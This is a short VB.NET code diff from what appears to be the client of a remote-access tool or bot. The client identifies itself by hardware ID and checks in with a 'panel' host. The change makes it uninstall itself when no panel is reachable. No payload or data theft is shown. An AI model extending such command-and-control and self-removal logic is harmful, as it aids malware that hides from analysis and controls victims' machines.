@@ -100,10 +100,12 @@ Public Class MainController
             C.ID = ID & "_" & HWD()
             C.Data = ClientData()
             
-            If C.IsPanel(C.Host) Then
+            If C.IsPanel(C.Host) = True Then
                 C.Connect()
                 C.Send("Online")
                 C.Log("Succ", "Client is Connected")
+            Else
+                Uninstall(True, False)
             End If
             
             Dim t As New Thread(AddressOf IND)
